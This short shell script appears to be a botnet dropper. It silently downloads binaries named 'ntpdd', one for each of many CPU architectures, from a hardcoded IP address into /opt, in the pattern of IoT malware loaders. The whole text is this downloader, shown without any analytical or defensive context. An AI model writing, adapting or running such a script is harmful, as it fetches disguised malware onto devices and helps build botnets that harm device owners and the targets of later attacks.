#!/bin/sh

bins="ntpdd.arm4 ntpdd.arm4tl ntpdd.arm5 ntpdd.arm6 ntpdd.arm7 ntpdd.m68k ntpdd.mips ntpdd.mpsl ntpdd.mips64 ntpdd.ppc ntpdd.sh4 ntpdd.x86 ntpdd.x86_64 ntpdd.spc"


for bin in $bins; do
        wget -q http://45.95.168.103/all/$bin -O /opt/$bin 

done
